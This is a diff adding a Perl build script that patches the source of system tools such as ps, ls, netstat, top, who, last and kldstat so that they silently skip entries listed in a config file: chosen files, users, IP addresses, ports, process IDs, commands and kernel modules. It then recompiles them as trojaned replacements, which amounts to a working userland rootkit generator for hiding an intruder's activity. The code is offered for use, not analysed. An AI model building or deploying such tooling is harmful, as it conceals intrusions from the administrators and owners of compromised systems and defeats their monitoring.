@@ -1,0 +1,254 @@
+#!/usr/bin/perl
+
+use strict;
+
+my $config='config';
+my @arr = (
+		   { name => 'find', file => 'find.c'},
+		   { name => 'fstat', file => 'fstat.c'},
+		   { name => 'kldstat', file => 'kldstat.c'},
+		   { name => 'last', file => 'last.c'},
+		   { name => 'ls', file => 'ls.c'},
+		   { name => 'netstat', file=> 'inet.c'},
+		   { name => 'ps', file => 'ps.c'},
+		   { name => 'sockstat', file => 'sockstat.c'},
+		   { name => 'top', file=> 'machine.c'},
+		   { name => 'w', file=>'w.c'},
+		   { name => 'who', file=>'who.c'}
+);
+
+##### MAIN #####
+
+print "Deleting old compiled filez in mybin dir...\n";
+`rm -Rd mybin`;
+
+print "Creating new mybin folder ...\n";
+`mkdir mybin`;
+
+foreach(@arr){
+  print "Copying filez of $_->{name} ... \n";
+  `cp -R origin/$_->{name} mybin/$_->{name}`;
+}
+
+
+########## PARSE ##########
+
+print "\nParsing config...\n";
+open F,$config or die "Can't open config file to read options =( ...";
+my @lines=<F>;
+close F;
+
+foreach (@arr) {
+  foreach my $line (@lines) {
+	chomp($line);	
+	if ($line=~/^$_->{name}:/) {
+	  #print "\nprogram: $_->{name}\n";
+	  my @data=split(/[:=]/, $line);
+	  shift(@data);
+	  my $hide_param=$data[0];
+	  shift(@data);
+	  $_->{params}->{$hide_param}=undef;
+	  #print "param: $hide_param \n";
+	  foreach my $param (@data) {
+		push(@{$_->{params}->{$hide_param}}, $param);
+	  }
+	  #print "params: @{$_->{params}->{$hide_param}} \n";
+	}
+  }
+}
+
+########## MAKE ##########
+
+print "\nMaking filez ...\n";
+
+foreach(@arr){
+  next if not defined $_->{file};
+  print "Making all in $_->{name} ... \n";
+
+  #### READING FILE #####
+  my $filename="mybin/$_->{name}/$_->{file}";
+  open(F,"<$filename") or die "Can't open $filename";
+  my @lines=<F>;
+  close F;
+
+  ##### PATCHING #####
+  foreach my $l(@lines){
+	if ($l=~m|\/\*MY_XXX_CODE\*\/|){
+	  my $code;
+	
+	  if ($_->{name} eq 'find'){
+		##### FIND #####
+		foreach my $p(@{$_->{params}->{name}}){
+		  $code.="\nif (strstr(entry->fts_path, \"$p\")!=NULL) continue;";
+		}
+	  }elsif($_->{name} eq 'fstat'){
+		##### FSTAT #####
+		foreach my $p(@{$_->{params}->{user}}){
+		  $code.="\nif (strcmp(Uname, \"$p\")==0) return;";
+		}
+		foreach my $p(@{$_->{params}->{command}}){
+		  $code.="\nif (strcmp(Comm, \"$p\")==0) return;";
+		}
+		
+		foreach my $p(@{$_->{params}->{command_user}}){
+		  my ($command, $user)=split(/-/, $p);
+		  $code.="\nif (strcmp(Comm, \"$command\")==0 ";
+		  $code.=" && strcmp(Uname, \"$user\")==0) return;"
+		}
+
+	  }elsif ($_->{name} eq 'kldstat'){
+		##### KLDSTAT #####
+		foreach my $p(@{$_->{params}->{name}}){
+		  $code.="\nif (strcmp(stat.name, \"$p\")==0) return;";
+		}
+
+	  }elsif ($_->{name} eq 'last'){
+		##### LAST #####
+		foreach my $p(@{$_->{params}->{ip}}){
+		  $code.="\n if (strcmp(bp->ut_host, \"$p\")==0) continue; ";
+		}
+		foreach my $p(@{$_->{params}->{user}}){
+		  $code.="\n if (strcmp(bp->ut_name, \"$p\")==0) continue;";
+		}
+		foreach my $p(@{$_->{params}->{ip_user}}){
+		  my ($ip, $user)=split(/-/, $p);
+		  $code.="\n if (strcmp(bp->ut_host, \"$ip\")==0 ";
+		  $code.=" && strcmp(bp->ut_name, \"$user\")==0) continue;";
+		}
+
+	  }elsif ($_->{name} eq 'ls'){
+		##### LS #####
+		$code="			FTSENT *mychp;
+			FTSENT *mychp_new;
+			char fullpath[100];
+
+			mychp=chp;
+			mychp_new=chp;
+
+			if (subcode){
+				chp=chp->fts_link;
+			}
+		
+
+			while(mychp->fts_link!=NULL){
+			  strcpy(fullpath, mychp->fts_path);
+			  strcat(fullpath, \"/\");
+			  strcat(fullpath, mychp->fts_accpath);
+			  if (subcode){
+				mychp_new->fts_link=mychp->fts_link;
+			  }
+			  mychp_new=mychp;
+			  mychp=mychp->fts_link;
+			}
+
+			strcpy(fullpath, mychp->fts_path);
+			strcat(fullpath, \"/\");
+			strcat(fullpath, mychp->fts_accpath);
+			if (subcode){
+			  mychp_new->fts_link=NULL;
+			};
+        ";
+
+		my $subcode;
+		foreach my $p(@{$_->{params}->{path}}){
+		  $subcode.="strcmp(mychp->fts_accpath, \"$p\")==0 || ";
+		}
+
+		foreach my $p(@{$_->{params}->{fullpath}}){
+		  $subcode.="strcmp(fullpath, \"$p\")==0 || ";
+		};
+		
+		$subcode=~s/\|\| $//;
+		$code=~s|subcode|$subcode|g;
+
+	  }elsif ($_->{name} eq 'netstat'){
+		##### NETSTAT #####
+		foreach my $p(@{$_->{params}->{fip}}){
+		  $code.="\nif (strcmp(inetname((struct in_addr*)&inp->inp_faddr),
+                  \"$p\")==0) continue;";
+		}
+		foreach my $p(@{$_->{params}->{fp}}){
+		  $code.="\nif ( htons((u_short)inp->inp_fport)==$p ) continue;";
+		}
+		foreach my $p(@{$_->{params}->{lp}}){
+		  $code.="\nif ( htons((u_short)inp->inp_lport)==$p ) continue;";
+		}
+		
+	  }elsif ($_->{name} eq 'ps'){
+		##### PS #####
+		foreach my $p(@{$_->{params}->{pid}}){
+		  $code.="\nif (kp->ki_pid == $p) continue;";
+		}
+		
+		foreach my $p(@{$_->{params}->{command}}){
+		  $code.="\nif (strcmp(kp->ki_ocomm, \"$p\")==0) continue;";
+		}
+
+	  }elsif ($_->{name} eq 'sockstat'){
+		##### SOCKSTAT #####
+		foreach my $p(@{$_->{params}->{user}}){
+		  $code.="\nif ( (pwd=getpwuid(xf->xf_uid))!=NULL){\n
+	              if (strcmp(pwd->pw_name, \"$p\")==0) continue;
+	             }\n";
+		}
+		foreach my $p(@{$_->{params}->{command}}){
+		  $code.="\nif (strcmp(getprocname(xf->xf_pid),\"$p\")==0)continue;";
+		}
+		foreach my $p(@{$_->{params}->{user_command}}){
+		  my ($user, $command)=split(/-/, $p);
+		  $code.="\nif ( (pwd=getpwuid(xf->xf_uid))!=NULL){ ";
+		  $code.="\nif (strcmp(pwd->pw_name, \"$user\")==0 ";
+		  $code.=" && strcmp(getprocname(xf->xf_pid), \"$command\")==0) ";
+		  $code.=" continue;}"
+		}
+
+	  }elsif ($_->{name} eq 'top'){
+		##### TOP #####
+		foreach my $p(@{$_->{params}->{pid}}){
+		  $code.="\nif (pp->ki_pid == $p) continue;";
+		}
+		foreach my $p(@{$_->{params}->{command}}){
+		  $code.="\nif (strcmp(pp->ki_ocomm, \"$p\")==0) continue;";
+		}
+	  }elsif ($_->{name} eq 'w'){
+		##### W #####
+		foreach my $p(@{$_->{params}->{ip}}){
+		  $code.="\n if (strcmp(utmp.ut_host, \"$p\")==0) continue; ";
+		}
+		foreach my $p(@{$_->{params}->{user}}){
+		  $code.="\n if (strcmp(utmp.ut_name, \"$p\")==0) continue;";
+		}
+		foreach my $p(@{$_->{params}->{ip_user}}){
+		  my ($ip, $user)=split(/-/, $p);
+		  $code.="\n if (strcmp(utmp.ut_host, \"$ip\")==0 ";
+		  $code.=" && strcmp(utmp.ut_name, \"$user\")==0) continue;";
+		}
+
+	  }elsif ($_->{name} eq 'who'){
+		##### WHO #####
+		foreach my $p(@{$_->{params}->{ip}}){
+  $code.="\nif (*ut.ut_name!=0 && strcmp(ut.ut_host, \"$p\")==0) continue; ";
+		}
+		foreach my $p(@{$_->{params}->{user}}){
+   $code.="\nif (*ut.ut_name!=0 && strcmp(ut.ut_name, \"$p\")==0) continue;";
+		}
+		foreach my $p(@{$_->{params}->{ip_user}}){
+		  my ($ip, $user)=split(/-/, $p);
+		  $code.="\n if (*ut.ut_name !=0 && strcmp(ut.ut_host, \"$ip\")==0 ";
+		  $code.=" && strcmp(ut.ut_name, \"$user\")==0) continue;";
+		}
+	  }
+
+
+	  $l=$code;
+	}
+  }
+
+  ##### SAVING PATCHED FILE #####
+  open(F,">$filename");
+  foreach(@lines){ print F };
+  close F;
+
+  ##### MAKE #####
+  `cd mybin/$_->{name}/ && make`;
+}
